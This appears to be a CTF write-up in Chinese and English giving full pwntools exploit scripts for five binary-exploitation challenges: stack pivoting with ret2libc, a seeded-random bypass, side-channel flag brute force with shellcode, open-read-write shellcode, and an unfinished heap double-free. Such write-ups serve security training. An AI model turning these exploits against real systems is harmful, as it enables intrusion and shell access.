
# PWN

## Stack Pivoting | Solved | CrazyCat
简单的栈迁移+ret2libc
```
from pwn import *
from wstube import websocket
import sys

context(arch='amd64', os='linux', log_level='debug')
local = True if len(sys.argv) == 1 else False
elf_path = './' + sys.argv[0][:-3]
libc_path = './'
if local:
    p = process(elf_path)
else:
    ip, port = '27.25.151.198:37085'.split(':')
    p = remote(ip, port)
    # p = websocket("")

def debug():
    if local:
        gdb.attach(p, '''
            b main
            b func
        ''')

elf = ELF(elf_path)
libc = ELF(libc_path + 'libc.so.6')

pop_rdi = 0x401263
pop_rsi_r15 = 0x401261
ret = 0x40101a
leave_ret = 0x4011ce
func = 0x40119f
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
read_plt = elf.plt['read']
bss = elf.bss() + 0x800

p.recvuntil(b'did ?')
payload = b'a' * 0x40 + p64(bss) + p64(0x4011ab)
p.send(payload)

payload = flat([
    bss,
    pop_rdi,
    puts_got,
    puts_plt,
    0x4011b7
]).ljust(0x40, b'\x00')
payload += p64(bss - 0x40) + p64(leave_ret)
p.recvuntil(b'did ?\n')
p.send(payload)
puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = puts_addr - libc.symbols['puts']
log.info(f'libc_base: {hex(libc_base)}')
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

payload = flat([
    b'a' * 0x20,
    pop_rdi,
    binsh,
    system,
]).ljust(0x40, b'\x00')
payload += p64(bss - 0x40) + p64(leave_ret)
debug()
# pause()
p.send(payload)

p.interactive()

```
## pdd助力 | Solved | CrazyCat
随机数绕过，然后普通的ret2libc
```
from pwn import *
from wstube import websocket
import ctypes
import sys

context(arch='amd64', os='linux', log_level='debug')
local = True if len(sys.argv) == 1 else False
elf_path = './' + sys.argv[0][:-3]
libc_path = './'
if local:
    p = process(elf_path)
else:
    ip, port = '27.25.151.198:42809'.split(':')
    p = remote(ip, port)
    # p = websocket("")

def debug():
    if local:
        gdb.attach(p, '''
            b func
        ''')

libc = ctypes.CDLL("/lib/x86_64-linux-gnu/libc.so.6")
libc.srand(libc.time(0))
libc.srand(libc.rand() % 5 + 0xfd5df463)
for i in range(0x37):
    p.sendlineafter(b'good!\n', str(libc.rand() % 4 + 1).encode())
libc.srand(8)
for i in range(0x37):
    p.sendlineafter(b'good!\n', str(libc.rand() % 4 + 8).encode())

elf = ELF(elf_path)
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
pop_rdi = 0x401483
ret = 0x40101a
payload = flat([
    b'a' * 0x38,
    pop_rdi,
    puts_got,
    puts_plt,
    ret,
    0x40121f
])
debug()
p.sendlineafter(b'man.\n', payload)
puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.info(f'puts_addr: {hex(puts_addr)}')
from LibcSearcher import LibcSearcher
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
payload = flat([
    b'a' * 0x38,
    pop_rdi,
    binsh,
    system
])
p.sendlineafter(b'man.', payload)

p.interactive()

```
## shellcode | Solved | CrazyCat
侧信道爆破
```
from pwn import *
from wstube import websocket
import sys

context(arch='amd64', os='linux')
# context.log_level = 'debug' 
local = True if len(sys.argv) == 1 else False
elf_path = './' + sys.argv[0][:-3]
libc_path = './'


def debug():
    if local:
        gdb.attach(p, '''
            b main
        ''')

def exp(dis, char):
    p.recvuntil(b"command: ")
    # flag->0xd
    # flag.txt->0xf
    shellcode = asm('''
        add rax, 0xd
        call rax
    ''') + b'./flag\x00'
    shellcode += asm('''
        pop rdi
        xor esi,esi
        xor edx,edx
        mov rax,2
        syscall
                     
        mov rdi,rax
        mov rsi,rsp
        mov edx,0x100
        xor eax,eax
        syscall
                     
        mov dl, byte ptr [rsi+{}]
        mov cl, {}
        cmp cl,dl
        jz loop
        mov eax,60
        syscall
                     
        loop:
        jmp loop
    '''.format(dis, char))
    # debug()
    p.send(shellcode)
    # pause()

flag = "flag{"
i = len(flag)
while not "}" in flag:
    for j in range(0x20, 0x80):
        print('--------' * 10)
        if local:
            p = process(elf_path)
        else:
            ip, port = '27.25.151.198:40110'.split(':')
            p = remote(ip, port)
            # p = websocket("")
        try:
            log.info("Trying {} pos : {}".format(i, chr(j)))
            exp(i, j)
            p.recvline(timeout=3)
            p.send(b'\n')
            log.success("{} pos : {} success".format(i, chr(j)))
            flag += chr(j)
            with open('true_flag.txt', 'w') as f:
                f.write(flag)
            i += 1
            p.close()
            break
        except Exception as e: 
            p.close()


log.success("flag : {}".format(flag))

p.interactive()

```
![](https://cdn.nlark.com/yuque/0/2025/png/38649036/1749305541389-5d3ab784-e1be-4de9-bc92-e0ad33f219f0.png)
## 三步走战略 | Solved | CrazyCat
orw
```
from pwn import *
from wstube import websocket
import sys

context(arch='amd64', os='linux', log_level='debug')
local = True if len(sys.argv) == 1 else False
elf_path = './' + sys.argv[0][:-3]
libc_path = './'
if local:
    p = process(elf_path)
else:
    ip, port = '27.25.151.198:34743'.split(':')
    p = remote(ip, port)
    # p = websocket("")

def debug():
    if local:
        gdb.attach(p, '''
            b *0x401414
        ''')

elf = ELF(elf_path)
bss = elf.bss() + 0x800

p.sendlineafter(b'advance. ', b'')

shellcode = b'./flag\x00\x00'
shellcode += asm('''
    mov rax, 0x2
    mov rdi, 0x1337000
    mov rsi, 0
    syscall
                
    mov rax, 0
    mov rdi, 3
    mov rsi, 0x404500
    mov rdx, 0x100
    syscall
                
    mov rax, 1
    mov rdi, 1
    mov rsi, 0x404500
    syscall
    
''')
p.recvuntil(b'speak:')
p.sendline(shellcode)
payload = b'a' * 0x48 + p64(0x1337008)
debug()
p.recvuntil(b'say?')
p.sendline(payload)


p.interactive()

```
## 梦中情pwn | Working | CrazyCat
堆的菜单题，flag从环境变量中读取，本地调试的时候需要加个环境变量
这道菜单题有增删查，chunk的size在0x40以内，不是利用tcache bin就是fast bin，结合其他题目版本都是2.35，这题没另外给libc,这题大概率也是2.35，所以有tcache bin。
题目从环境变量中读取flag然后存放在heap上下标为0的chunk里，
![[Pasted image 20250609153225.png]]
删除和查找函数所用的collect_num函数过滤了下标为0的时候的输入所以无法直接对这个chunk来操作。
但删除时存在漏洞，删除函数的逻辑会直接free对应的chunk然后再清除指针，但指针清除时如果待清除的指针前面的位置有空，则目标指针不会被清除，从而存在uaf漏洞。
这里可以使用fast bin的double free漏洞。
首先申请八个chunk填满t
```python
from pwn import *
from wstube import websocket
import sys

context(arch='amd64', os='linux', log_level='debug')
local = True if len(sys.argv) == 1 else False
elf_path = './' + sys.argv[0][:-3]
libc_path = './'
if local:
    p = process(elf_path, env={"FLAG": "test_flag"})
else:
    ip, port = ':'.split(':')
    p = remote(ip, port)
    # p = websocket("")

def debug():
    if local:
        gdb.attach(p, '''
            b main
            b recall_memory
            b erase_memory
            b implant_user_memory
        ''')

def choice(idx):
    p.recvuntil(b"space\n\n")
    p.sendline(str(idx).encode())

def add(content):
    choice(1)
    p.recvuntil(b"characters).\n")
    p.sendline(content)

def show(idx):
    choice(2)
    p.recvuntil(b"access:\n")
    p.sendline(str(idx).encode())

def delete(idx):
    choice(3)
    p.recvuntil(b"access:\n")
    p.sendline(str(idx).encode())

for i in range(8):
    add(b"A" * 0x8)
for i in range(7):
    delete(7 - i)
delete(8)
for i in range(7):
    add(b"A" * 0x8)
show(8)
p.recvuntil(b'Reliving a slice of a dream...\n')
key = u64(p.recv(7).ljust(8, b'\x00')) >> 16
heap = key << 12
delete(8)
fake_fd = key
add(p64(fake_fd))
add(b'a' * 0x8)
add(b'b' * 0x8)
for i in range(7):
    delete(7 - i)
delete(8)
delete(10)
delete(9)
for i in range(7):
    add(b"A" * 0x8)
fake_fd = (heap + 0x2a0) ^ key
add(p64(fake_fd))
add(b'a' * 0x8)
add(b'b' * 0x8)
add(b'c' * 0x8 + p64(heap + 0x330))
show(1)
debug()

p.interactive()


```
